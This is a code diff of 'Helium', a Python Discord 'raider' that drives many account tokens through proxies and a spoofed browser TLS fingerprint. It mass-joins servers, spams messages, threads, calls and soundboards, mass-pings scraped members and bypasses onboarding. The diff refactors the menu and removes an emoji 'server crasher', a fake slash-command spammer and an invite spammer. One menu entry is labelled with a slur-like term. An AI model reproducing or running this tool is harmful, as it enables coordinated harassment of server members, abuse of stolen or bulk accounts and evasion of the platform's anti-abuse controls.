@@ -1,11 +1,5 @@
-import os
-
-if os.name == "nt":
-    pass
-else:
-    exit()
-
 try:
+    import os
     from colorama import Fore
     from colorist import ColorHex as h
     from datetime import datetime
@@ -47,10 +41,7 @@ except ModuleNotFoundError:
     import uuid
     import websocket
 
-def Clear():
-    os.system('cls')
-
-Clear()
+os.system('cls')
 os.system('title Helium')
 
 session = tls_client.Session(client_identifier="chrome_119",random_tls_extension_order=True)
@@ -62,7 +53,7 @@ def get_random_str(length: int) -> str:
 
 def wrapper(func):
     def wrapper(*args, **kwargs):
-        Clear()
+        os.system('cls')
         console.render_ascii()
         result = func(*args, **kwargs)
         return result
@@ -152,7 +143,7 @@ class Render:
             self.background = C[color]
 
     def render_ascii(self):
-        Clear()
+        os.system('cls')
         os.system(f"title Helium - Connected as {os.getlogin()}")
         edges = ["╗", "║", "╚", "╝", "═", "╔"]
         title = f"""
@@ -170,21 +161,17 @@ class Render:
     def raider_options(self):
         with open("data/tokens.txt", "r") as f:
             tokens = f.read().splitlines()
-
         with open("data/proxies.txt") as f:
             proxies = f.read().splitlines()
-
         edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"]
-
         title = f"""{' '*44}{Fore.RESET} Loaded ‹{Fore.LIGHTCYAN_EX}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{Fore.LIGHTCYAN_EX}{len(proxies)}{Fore.RESET}> proxies
 
 {'╭─────────────────────────────────────────────────────────────────────────────────────────────╮'.center(self.size)}
-{'│ «01» Joiner            «07» Token Formatter    «13» Voice Joiner      «19» Call Spammer     │'.center(self.size)}
-{'│ «02» Leaver            «08» Button Click       «14» Change Nickname   «20» Inviter          │'.center(self.size)}
-{'│ «03» Spammer           «09» Accept Rules       «15» Thread Spammer    «21» ???              |'.center(self.size)}
-{'│ «04» Token Checker     «10» Guild Check        «16» Friender          «22» ???              │'.center(self.size)}
-{'│ «05» Reactor           «11» Bio Changer        «17» Typer             «23» ???              │'.center(self.size)}
-{'│ «06» Voice Raper       «12» Onliner            «18» Onboarding Bypass «24» Exit             │'.center(self.size)}
+{'│ «01» Joiner            «06» Token Formatter    «11» Voice Joiner      «16» Call Spammer     │'.center(self.size)}
+{'│ «02» Leaver            «07» Button Click       «12» Change Nickname   «17» Voice Raper      │'.center(self.size)}
+{'│ «03» Spammer           «08» Accept Rules       «13» Thread Spammer    «18» Onboarding Bypass|'.center(self.size)}
+{'│ «04» Token Checker     «09» Guild Check        «14» Friender          «19» Onliner          │'.center(self.size)}
+{'│ «05» Reactor           «10» Bio Changer        «15» Typer             «20» ???              │'.center(self.size)}
 {'╰─────────────────────────────────────────────────────────────────────────────────────────────╯'.center(self.size)}
 """
         for edge in edges:
@@ -483,9 +470,6 @@ class Raider:
             'x-debug-options': 'bugReporterEnabled',
             "x-super-properties": self.props,
         }
-
-    def soundboard_sounds(self, token):
-        return session.get("https://canary.discord.com/api/v9/soundboard-default-sounds", headers=self.headers(token)).json()
     
     def joiner(self, token, invite):
         try:
@@ -549,37 +533,6 @@ class Raider:
         except Exception as e:
             console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
-    def emojis():
-        emos = list("😀😃😄😁😆😅😂🤣😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😮‍💨😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😶‍🌫️😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵😵‍💫🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾")
-        random.shuffle(emos)
-        return ''.join(emos)
-
-    def avatar_changer(self, token):
-        try:
-            picture = [f for f in os.listdir("avatars/") if isfile(join("avatars/", f))]
-
-            random_picture = random.choice(picture)
-            with open(f"avatars/{random_picture}", "rb+") as f:
-                encoded_string = base64.b64encode(f.read())
-
-            payload = {
-                'avatar': f"data:image/png;base64,{(encoded_string.decode('utf-8'))}",
-            }
-
-            response = session.patch(
-                f"https://canary.discord.com/api/v9/users/@me", 
-                headers=self.headers(token), 
-                json=payload
-            )
-
-            match response.status_code:
-                case 200:
-                    print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-                case _:
-                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
-        except Exception as e:
-            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
-
     def vc_joiner(self, token, guild, channel, ws):
         try:
             for _ in range(1):
@@ -624,6 +577,7 @@ class Raider:
                     }
                 )
             )
+            print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Onlined{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
@@ -673,11 +627,6 @@ class Raider:
             else:
                 payload = {
                     "content": message
-                }
-
-            if emoiyspam:
-                payload = {
-                    "content": Raider.emojis()
                 }
             
             response = session.post(
@@ -751,40 +700,6 @@ class Raider:
                 match response.status_code:
                     case 204:
                         console.log("SENT", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", tag)
-                    case 429:
-                        retry_after = response.json().get("retry_after")
-                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
-                        time.sleep(float(retry_after))
-                    case _:
-                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
-                        return
-                time.sleep(5)
-        except Exception as e:
-            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
-
-    def pretend_spammer(self, token, guild, channel, message, count):
-        try:
-            while True:
-                headers = self.headers(token)
-                headers[
-                    "content-type"
-                ] = "multipart/form-data; boundary=----WebKitFormBoundaryT2gaxV1TBgqdCl5l"
-                
-                pings = self.get_random_members(guild, int(count))
-                data = (
-                    '------WebKitFormBoundaryT2gaxV1TBgqdCl5l\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n{"type":2,"application_id":"1006133881403084860","guild_id":"%s","channel_id":"%s","session_id":"%s","data":{"version":"1173568212244385863","id":"1118824035086770243","name":"8ball","type":1,"options":[{"type":3,"name":"question","value":"%s"}],"application_command":{"id":"1118824035086770243","type":1,"application_id":"1006133881403084860","version":"1173568212244385863","name":"8ball","description":"Ask the 8ball a question","options":[{"type":3,"name":"question","description":"…","required":true,"description_localized":"…","name_localized":"question"}],"integration_types":[0],"description_localized":"Ask the 8ball a question","name_localized":"8ball"},"attachments":[]},"nonce":"1176874121972154368","analytics_location":"slash_ui"}\r\n------WebKitFormBoundaryT2gaxV1TBgqdCl5l--\r\n'
-                    % (guild, channel, uuid.uuid4().hex, f"{message} {pings}")
-                )
-
-                response = session.post(
-                    "https://canary.discord.com/api/v9/interactions",
-                    headers=headers,
-                    data=data,
-                )
-
-                match response.status_code:
-                    case 204:
-                        console.log("SEND", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                     case 429:
                         retry_after = response.json().get("retry_after")
                         console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
@@ -917,7 +832,7 @@ class Raider:
                 "around": message_id, 
                 "limit": 50
             }
-            Clear()
+            os.system('cls')
             console.render_ascii()
 
             for token in tokens:
@@ -1005,15 +920,16 @@ class Raider:
             ]
             Menu().run(add_reaction, args)
 
-    def soundbord(self, token, channel, sounds):
+    def soundbord(self, token, channel):
         try:
+            sounds = session.get("https://canary.discord.com/api/v9/soundboard-default-sounds", headers=self.headers(token)).json()
             time.sleep(1)
             while True:
                 sound = random.choice(sounds)
 
                 name = sound.get("name")
 
-                json_data = {
+                payload = {
                     "emoji_id": None,
                     "emoji_name": sound.get("emoji_name"),
                     "sound_id": sound.get("sound_id"),
@@ -1022,7 +938,7 @@ class Raider:
                 response = session.post(
                     f'https://canary.discord.com/api/v9/channels/{channel}/send-soundboard-sound', 
                     headers=self.headers(token), 
-                    json=json_data,
+                    json=payload,
                 )
 
                 match response.status_code:
@@ -1115,13 +1031,13 @@ class Raider:
                 'around': message_id,
             }
 
-            response = session.get(
+            response1 = session.get(
                 f'https://canary.discord.com/api/v9/channels/{channel_id}/messages',
                 params=payload,
                 headers=self.headers(token),
             )
 
-            messages = response.json()
+            messages = response1.json()
             messagebottoclick = next((x for x in messages if x["id"] == message_id), None)
 
             if messagebottoclick is None:
@@ -1146,13 +1062,13 @@ class Raider:
                 },
             }
 
-            responseq = session.post(
+            response2 = session.post(
                 'https://canary.discord.com/api/v9/interactions',
                 headers=self.headers(token),
                 json=data,
             )
 
-            match responseq.status_code:
+            match response2.status_code:
                 case 200:
                     print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.RESET} {token[:25]}.{Fore.LIGHTCYAN_EX}**")
                 case _:
@@ -1274,10 +1190,6 @@ class Raider:
             match response.status_code:
                 case 200:
                     print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.LIGHTCYAN_EX}Success{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-                case 429:
-                    retry_after = response.json().get("retry_after")
-                    console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
-                    time.sleep(float(retry_after))
                 case _:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
         except Exception as e:
@@ -1308,34 +1220,6 @@ class Raider:
                         time.sleep(float(retry_after))
                     case _:
                         console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
-                        break
-        except Exception as e:
-            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
-
-    def inviter(self, token, channel_id):
-        try:
-            data = {
-                "max_age": random.randint(1, 86400),
-                "max_uses": 0
-            }
-
-            while True:
-                response = session.post(
-                    f"https://canary.discord.com/api/v9/channels/{channel_id}/invites",
-                    headers=self.headers(token),
-                    json=data
-                )
-
-                match response.status_code:
-                    case 200:
-                        code = response.json().get("code")
-                        print(f"{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S')}{Fore.RESET} {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.LIGHTBLACK_EX}-> {Fore.RESET}Created invite {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}** Invite {Fore.LIGHTBLACK_EX}->  https://discord.gg/{code}")
-                    case 429:
-                        retry_after = response.json().get("retry_after")
-                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
-                        time.sleep(float(retry_after))
-                    case _:
-                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                         break
         except Exception as e:
             console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
@@ -1489,29 +1373,26 @@ class Menu:
             "3": self.spammer, 
             "4": self.checker,
             "5": self.reactor, 
-            "6": self.soundbord,
-            "7": self.formatter,
-            "8": self.button,
-            "9": self.accept,
-            "10": self.guild,
-            "11": self.bio,
-            "12": self.online,
-            "13": self.voicejoiner,
-            "14": self.nick_changer,
-            "15": self.thad,
-            "16": self.friend,
-            "17": self.typier,
+            "6": self.formatter,
+            "7": self.button,
+            "8": self.accept,
+            "9": self.guild,
+            "10": self.bio_changer,
+            "11": self.voice_joiner,
+            "12": self.nick_changer,
+            "13": self.Thread_Spammer,
+            "14": self.friender,
+            "15": self.typier,
+            "16": self.caller,
+            "17": self.soundbord,
             "18": self.onboard,
-            "19": self.caller,
-            "20": self.inviter,
-            "24": self.exit,
+            "19": self.onliner,
         }
 
     def main_menu(self, _input=None):
         if _input:
             input()
         console.run()
-        print(Raider.emojis())
         choice = input(f"{' '*4}{Fore.LIGHTCYAN_EX}> {Fore.RESET}")
         if choice in self.options:
             console.render_ascii()
@@ -1522,7 +1403,7 @@ class Menu:
 
     def run(self, func, args):
         threads = []
-        Clear()
+        os.system('cls')
         console.render_ascii()
         for arg in args:
             thread = threading.Thread(target=func, args=arg)
@@ -1545,50 +1426,28 @@ class Menu:
             Menu().main_menu()
         channel = Link.split("/")[5]
         guild = Link.split("/")[4]
-        Clear()
+        os.system('cls')
         console.render_ascii()
         with open("data/tokens.txt", "r") as f:
             tokens = f.read().splitlines()
-        tokenq = random.choice(tokens)
-        sounds = Raider().soundboard_sounds(tokenq)
         for token in tokens:
             threading.Thread(target=self.raider.vc_joiner, args=(token, guild, channel, websocket.WebSocket())).start()
-            threading.Thread(target=self.raider.soundbord, args=(token, channel, sounds)).start()
+            threading.Thread(target=self.raider.soundbord, args=(token, channel)).start()
 
     @wrapper
-    def friend(self):
+    def friender(self):
         with open("data/tokens.txt", "r") as f:
             tokens = f.read().splitlines()
         os.system('title Helium - Friender')
         nickname = input(console.prompt("Nick"))
         if nickname == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         args = [
             (token, nickname) for token in tokens
         ]
         self.run(self.raider.friender, args)
-
-    @wrapper
-    def inviter(self):
-        with open("data/tokens.txt", "r") as f:
-            tokens = f.read().splitlines()
-        os.system('title Helium - inviter')
-        Link = input(console.prompt("Channel LINK"))
-        if Link == "":
-            Menu().main_menu()
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
-        channel = Link.split("/")[5]
-        Clear()
-        console.render_ascii()
-        args = [
-            (token, channel) for token in tokens
-        ]
-        self.run(self.raider.inviter, args)
 
     @wrapper
     def caller(self):
@@ -1598,18 +1457,17 @@ class Menu:
         user_id = input(console.prompt("User ID"))
         if user_id == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         for token in tokens:
             threading.Thread(target=self.raider.call_spammer, args=(token, user_id)).start()
 
     @wrapper
-    def online(self):
+    def onliner(self):
         with open("data/tokens.txt", "r") as f:
             tokens = f.read().splitlines()
         os.system('title Helium - Onliner')
         for token in tokens:
-            print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Onlined{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
             threading.Thread(target=self.raider.onliner, args=(token, websocket.WebSocket())).start()
         input()
         self.main_menu()
@@ -1627,7 +1485,7 @@ class Menu:
         else:
             Menu().main_menu()
         channelid = Link.split("/")[5]
-        Clear()
+        os.system('cls')
         console.render_ascii()
         args = [
             (token, channelid) for token in tokens
@@ -1642,12 +1500,12 @@ class Menu:
         nick = input(console.prompt("Nick"))
         if nick == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         guild = input(console.prompt("Guild ID"))
         if guild == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         args = [
             (token, guild, nick) for token in tokens
@@ -1655,7 +1513,7 @@ class Menu:
         self.run(self.raider.mass_nick, args)
 
     @wrapper
-    def voicejoiner(self):
+    def voice_joiner(self):
         with open("data/tokens.txt", "r") as f:
             tokens = f.read().splitlines()
         os.system('title Helium - Voice Joiner')
@@ -1668,7 +1526,7 @@ class Menu:
             Menu().main_menu()
         guild = Link.split("/")[4]
         channel = Link.split("/")[5]
-        Clear()
+        os.system('cls')
         console.render_ascii()
         args = [
             (token, guild, channel, websocket.WebSocket()) for token in tokens
@@ -1676,14 +1534,14 @@ class Menu:
         self.run(self.raider.vc_joiner, args)
 
     @wrapper
-    def thad(self):
+    def Thread_Spammer(self):
         with open("data/tokens.txt", "r") as f:
             tokens = f.read().splitlines()
         os.system('title Helium - Thread Spammer')
         name = input(console.prompt("Name"))
         if name == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         Link = input(console.prompt("Channel LINK"))
         if Link == "":
@@ -1693,7 +1551,7 @@ class Menu:
         else:
             Menu().main_menu()
         channel_id = Link.split("/")[5]
-        Clear()
+        os.system('cls')
         console.render_ascii()
         args = [
             (token, channel_id, name) for token in tokens
@@ -1709,7 +1567,7 @@ class Menu:
         if invite == "":
             Menu().main_menu()
         invite = invite.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("discord.gg/", "").replace("https://discord.com/invite/", "").replace(".gg/", "").replace("https://canary.", "").replace("canary.", "")
-        Clear()
+        os.system('cls')
         console.render_ascii()
         args = [
             (token, invite) for token in tokens
@@ -1724,9 +1582,11 @@ class Menu:
         guild = input(console.prompt("Guild ID"))
         if guild == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
-        args = [(token, guild) for token in tokens]
+        args = [
+            (token, guild) for token in tokens
+        ]
         self.run(self.raider.leaver, args)
 
     @wrapper
@@ -1743,52 +1603,43 @@ class Menu:
             Menu().main_menu()
         guild_id = Link.split("/")[4]
         channel_id = Link.split("/")[5]
-        Clear()
         console.render_ascii()
-        emoiyspam = input(console.prompt("Server Crasher", True))
-        Clear()
+        massping = input(console.prompt("Massping", True))
+        os.system('cls')
         console.render_ascii()
-        if "y" in emoiyspam:
-            args = [(token, channel_id, None, None, None, None, True) for token in tokens]
-            self.run(self.raider.spammer, args)
-        else:
-            massping = input(console.prompt("Massping", True))
-            Clear()
+        message = input(console.prompt("Message"))
+        if message == "":
+            Menu().main_menu()
+        if "y" in massping:
+            os.system('cls')
             console.render_ascii()
-            message = input(console.prompt("Message"))
-            Clear()
+            print(f"{Fore.LIGHTWHITE_EX}Scraping users (this may take a while)...")
+            self.raider.member_scrape(guild_id, channel_id)
+            os.system('cls')
             console.render_ascii()
-            if message == "":
+            count = input(console.prompt("Pings Amount"))
+            if count == "":
                 Menu().main_menu()
-            if "y" in massping:
-                Clear()
-                console.render_ascii()
-                print(f"{Fore.LIGHTWHITE_EX}Scraping users (this may take a while)...")
-                self.raider.member_scrape(guild_id, channel_id)
-                Clear()
-                console.render_ascii()
-                count = input(console.prompt("Pings Amount"))
-                if count == "":
-                    Menu().main_menu()
-                Clear()
-                console.render_ascii()
-                dyno = input(console.prompt("Dyno Tag", True))
-                Clear()
-                console.render_ascii()
-                if "y" in dyno:
-                    args = [(token, guild_id, channel_id, message, count) for token in tokens]
-                    self.run(self.raider.dyno_massping, args)
-                else:
-                    pretend = input(console.prompt("Pretend Spammer", True))
-                    if "y" in pretend:
-                        args = [(token, guild_id, channel_id, message, count) for token in tokens]
-                        self.run(self.raider.pretend_spammer, args)
-                    else:
-                        args = [(token, channel_id, message, guild_id, True, count, False) for token in tokens]
-                        self.run(self.raider.spammer, args)
+            os.system('cls')
+            console.render_ascii()
+            dyno = input(console.prompt("Dyno Tag", True))
+            os.system('cls')
+            console.render_ascii()
+            if "y" in dyno:
+                args = [
+                    (token, guild_id, channel_id, message, count) for token in tokens
+                ]
+                self.run(self.raider.dyno_massping, args)
             else:
-                args = [(token, channel_id, message) for token in tokens]
+                args = [
+                    (token, channel_id, message, guild_id, True, count, False) for token in tokens
+                ]
                 self.run(self.raider.spammer, args)
+        else:
+            args = [
+                (token, channel_id, message) for token in tokens
+            ]
+            self.run(self.raider.spammer, args)
 
     def checker(self):
         os.system('title Helium - Checker')
@@ -1806,7 +1657,7 @@ class Menu:
             Menu().main_menu()
         channel_id = Link.split("/")[5]
         message_id = Link.split("/")[6]
-        Clear()
+        os.system('cls')
         console.render_ascii()
         self.raider.reactor_main(channel_id, message_id)
 
@@ -1829,13 +1680,13 @@ class Menu:
         guild_id = message.split("/")[4]
         channel_id = message.split("/")[5]
         message_id = message.split("/")[6]
-        Clear()
+        os.system('cls')
         console.render_ascii()
         print(f"{Fore.RESET}If there's 1 button {Fore.LIGHTCYAN_EX}press Enter{Fore.RESET}, if you want to click a second button, just type 1 or more.")
         optionbutton = input(f"{Fore.RESET}[{Fore.LIGHTCYAN_EX}Button Option{Fore.RESET}] → ")
         if optionbutton == "":
             optionbutton = 0
-        Clear()
+        os.system('cls')
         console.render_ascii()
         args = [
             (token, message_id, channel_id, guild_id, optionbutton) for token in tokens
@@ -1848,7 +1699,7 @@ class Menu:
         guild_id = input(console.prompt("Guild ID"))
         if guild_id == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         self.raider.accept_rules(guild_id)
 
@@ -1858,19 +1709,19 @@ class Menu:
         guild_id = input(console.prompt("Guild ID"))
         if guild_id == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         self.raider.guild_checker(guild_id)
 
     @wrapper
-    def bio(self):
+    def bio_changer(self):
         with open("data/tokens.txt", "r") as f:
             tokens = f.read().splitlines()
         os.system('title Helium - Bio Changer')
         bio = input(console.prompt("Bio"))
         if bio == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         args = [
             (token, bio) for token in tokens
@@ -1883,16 +1734,9 @@ class Menu:
         guild_id = input(console.prompt("Guild ID"))
         if guild_id == "":
             Menu().main_menu()
-        Clear()
+        os.system('cls')
         console.render_ascii()
         self.raider.onboard_bypass(guild_id)
-
-    @wrapper
-    def exit(self):
-        os.system('title Helium - Exit')
-        print(f"{Fore.RED}Exiting...")
-        time.sleep(2)
-        os._exit(0)
 
 if __name__ == "__main__":
     Menu().main_menu()
